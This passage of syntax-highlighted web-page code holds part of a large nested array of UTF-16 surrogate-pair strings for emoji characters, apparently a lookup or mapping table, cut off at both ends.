class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, 